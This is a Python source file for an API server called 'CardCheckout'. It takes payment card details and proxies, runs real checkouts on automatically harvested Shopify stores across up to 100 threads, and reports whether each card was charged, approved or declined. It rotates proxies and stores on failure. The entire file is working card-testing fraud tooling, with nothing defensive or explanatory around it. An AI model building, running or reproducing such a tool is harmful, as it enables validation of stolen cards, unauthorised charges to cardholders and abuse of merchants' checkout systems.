"""
api_server.py — CardCheckout API v1.0

Endpoints
─────────
GET  /              → main check: ?cc=<NUMBER|MM|YYYY|CVV>&proxy=<proxy>&url=<shop>
GET  /check         → same as /
POST /check         → JSON body
GET  /sites         → pool snapshot
GET  /sites/stats   → same as /sites
GET  /sites/harvest → force a harvest cycle now
GET  /sites/refresh → alias for /sites/harvest
GET  /health        → liveness
GET  /docs          → HTML docs
"""
from __future__ import annotations

import asyncio
import concurrent.futures
import functools
import logging
import os
import time
from typing import Optional

from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from checkout_engine import (
    run_checkout_for_card,
    parse_card_entry,
    normalize_proxy,
    CheckResult,
    CheckStatus,
)
import site_fetcher

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("api")

THREADS       = int(os.environ.get("CHECKER_THREADS", "100"))
MAX_RETRIES   = int(os.environ.get("CHECKER_RETRIES", "1"))
CHECK_TIMEOUT = float(os.environ.get("CHECKER_TIMEOUT", "120"))

_pool = concurrent.futures.ThreadPoolExecutor(max_workers=THREADS, thread_name_prefix="chk")

app = FastAPI(
    title="CardCheckout API",
    version="1.0.0",
    docs_url=None, redoc_url=None, openapi_url=None,
)


# ═══════════════════════════════════════════════════════════════════════
#  Response model
# ═══════════════════════════════════════════════════════════════════════

class CheckResponse(BaseModel):
    Response:    str   = "ERROR"
    CC:          str   = ""
    Price:       str   = ""
    Gate:        str   = "Shopify"
    Site:        str   = ""
    Charged:     str   = "False"
    status_code: str   = ""
    error:       str   = ""
    retryable:   bool  = False
    receipt_url: str   = ""
    elapsed:     float = 0.0


def _to_response(res: CheckResult) -> CheckResponse:
    return CheckResponse(
        Response    = res.status.value,
        CC          = res.card,
        Price       = res.amount or "",
        Gate        = "Shopify",
        Site        = res.shop_url or "",
        Charged     = "True" if res.status == CheckStatus.CHARGED else "False",
        status_code = res.status_code or "",
        error       = res.error or "",
        retryable   = bool(res.retryable),
        receipt_url = res.receipt_url or "",
        elapsed     = res.elapsed,
    )


# ═══════════════════════════════════════════════════════════════════════
#  Core runner
# ═══════════════════════════════════════════════════════════════════════

async def _run(cc: str, proxy: str | None, url: str | None) -> CheckResponse:
    # ── card
    try:
        cc = (cc or "").strip()
        parse_card_entry(cc)
    except Exception as exc:
        return CheckResponse(Response="ERROR", CC=cc or "",
                             status_code="CARD_INVALID",
                             error=f"invalid card: {exc}")

    # ── proxy
    proxy_url = ""
    if proxy:
        try:
            proxy_url = normalize_proxy(proxy)
        except Exception as exc:
            return CheckResponse(Response="ERROR", CC=cc,
                                 status_code="PROXY_INVALID",
                                 error=f"invalid proxy: {exc}")

    # ── site
    shop_url = (url or "").strip().rstrip("/")
    if not shop_url:
        shop_url = site_fetcher.pick_site() or ""
    if not shop_url:
        return CheckResponse(Response="ERROR", CC=cc,
                             status_code="NO_SITES",
                             error="no sites available — harvester still warming up")
    if not shop_url.startswith(("http://", "https://")):
        shop_url = "https://" + shop_url

    loop = asyncio.get_running_loop()
    attempts = 1 + MAX_RETRIES
    last: CheckResponse | None = None

    for attempt in range(1, attempts + 1):
        t0 = time.perf_counter()
        fn = functools.partial(run_checkout_for_card, shop_url, cc, proxy_url, CHECK_TIMEOUT)
        try:
            res: CheckResult = await loop.run_in_executor(_pool, fn)
        except Exception as exc:
            log.warning("worker exception: %s", exc)
            res = CheckResult(card=cc, status=CheckStatus.ERROR,
                              shop_url=shop_url,
                              status_code="WORKER_EXCEPTION",
                              error=str(exc), retryable=True,
                              elapsed=round(time.perf_counter() - t0, 2))

        out = _to_response(res)
        log.info(
            "att %d/%d | %-8s | %-22s | %-7s | %.1fs | %s",
            attempt, attempts, out.Response, out.status_code or "-",
            out.Price or "-", out.elapsed, shop_url,
        )

        if res.status in (CheckStatus.CHARGED, CheckStatus.APPROVED):
            site_fetcher.report_success(shop_url)
        elif res.status == CheckStatus.ERROR and res.retryable:
            site_fetcher.report_failure(shop_url, weight=1)

        if out.Response == "ERROR" and res.retryable and attempt < attempts and proxy_url:
            new_site = site_fetcher.pick_site(exclude={shop_url})
            if new_site and new_site != shop_url:
                shop_url = new_site
                continue
        return out

    return last  # type: ignore


# ═══════════════════════════════════════════════════════════════════════
#  Routes
# ═══════════════════════════════════════════════════════════════════════

@app.get("/", response_model=CheckResponse)
async def root(
    cc:    str = Query(..., description="NUMBER|MM|YYYY|CVV"),
    proxy: Optional[str] = Query(None, description="host:port:user:pass  or  http://user:pass@host:port"),
    url:   Optional[str] = Query(None, description="Optional Shopify URL — omitted = auto-pick"),
):
    return await _run(cc, proxy, url)


@app.get("/check", response_model=CheckResponse)
async def check(
    cc:    str = Query(...),
    proxy: Optional[str] = Query(None),
    url:   Optional[str] = Query(None),
):
    return await _run(cc, proxy, url)


class PostBody(BaseModel):
    cc:    str
    proxy: Optional[str] = None
    url:   Optional[str] = None


@app.post("/check", response_model=CheckResponse)
async def check_post(body: PostBody):
    return await _run(body.cc, body.proxy, body.url)


@app.get("/health")
async def health():
    return {
        "ok":      True,
        "threads": THREADS,
        "retries": MAX_RETRIES,
        "sites":   site_fetcher.pool_size(),
    }


@app.get("/sites")
async def sites():
    return site_fetcher.snapshot()


@app.get("/sites/stats")
async def sites_stats():
    return site_fetcher.snapshot()


@app.get("/sites/harvest")
async def sites_harvest():
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, functools.partial(site_fetcher.harvest_once, 200)
    )
    return {"ok": True, **result}


@app.get("/sites/refresh")
async def sites_refresh():
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, functools.partial(site_fetcher.harvest_once, 200)
    )
    return {"ok": True, **result}


# ═══════════════════════════════════════════════════════════════════════
#  Docs
# ═══════════════════════════════════════════════════════════════════════

_DOCS = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>CardCheckout API</title>
<style>
body{background:#0b0d12;color:#e5e7eb;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
max-width:820px;margin:60px auto;padding:0 24px;line-height:1.6}
h1{color:#a78bfa;font-weight:600}h3{color:#22d3ee;margin-top:32px}
code{background:#151823;padding:2px 8px;border-radius:6px;color:#38bdf8}
pre{background:#151823;padding:16px;border-radius:10px;overflow:auto;color:#d1d5db}
a{color:#22d3ee;text-decoration:none}hr{border:none;border-top:1px solid #1f2937;margin:28px 0}
.badge{background:#1e1b4b;color:#a78bfa;padding:3px 10px;border-radius:20px;font-size:12px}
</style></head><body>
<h1>CardCheckout API <span class="badge">v1.0</span></h1>
<p>Merged Shopify checkout engine — auto site harvesting, no third-party API.</p>
<hr>
<h3>GET /</h3>
<pre>GET /?cc=4111111111111111|12|2026|123&proxy=host:port:user:pass</pre>
<p>Explicit site:</p>
<pre>GET /?cc=...&proxy=...&url=https://store.myshopify.com</pre>
<h3>POST /check</h3>
<pre>POST /check
Content-Type: application/json
{"cc":"4111...|12|2026|123","proxy":"host:port:user:pass","url":"https://store.myshopify.com"}</pre>
<h3>Response</h3>
<pre>{
  "Response":    "CHARGED | APPROVED | DECLINED | ERROR",
  "CC":          "4111...|12|2026|123",
  "Price":       "12.34",
  "Gate":        "Shopify",
  "Site":        "https://...",
  "Charged":     "True | False",
  "status_code": "ORDER_PLACED | CARD_DECLINED | ...",
  "error":       "",
  "retryable":   false,
  "receipt_url": "https://...",
  "elapsed":     3.42
}</pre>
<h3>Pool tools</h3>
<p>
<a href="/sites">/sites</a> — snapshot.<br>
<a href="/sites/stats">/sites/stats</a> — same.<br>
<a href="/sites/harvest">/sites/harvest</a> — force a cycle now.<br>
<a href="/health">/health</a> — liveness.
</p>
</body></html>"""


@app.get("/docs", response_class=HTMLResponse)
async def docs():
    return HTMLResponse(_DOCS)


# ═══════════════════════════════════════════════════════════════════════
#  Entry
# ═══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", "8081"))
    log.info("starting api on :%d threads=%d", port, THREADS)
    uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
